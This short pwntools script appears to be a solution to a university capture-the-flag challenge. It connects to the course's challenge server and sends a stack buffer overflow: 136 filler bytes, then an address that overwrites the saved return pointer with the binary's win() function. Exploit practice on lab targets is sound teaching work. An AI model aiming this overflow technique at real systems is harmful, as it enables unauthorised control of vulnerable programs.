from pwn import *
#p = process('./chall'); # test locally
p = remote("cs2107-ctfd-i.comp.nus.edu.sg", 5001)
payload = b"A"*136
payload += p64(0x0000000000401209)  # Overwrite RIP with win() address
log.info(p.clean())
p.sendline(payload)
log.info(p.clean().decode(errors="ignore"))
p.close()
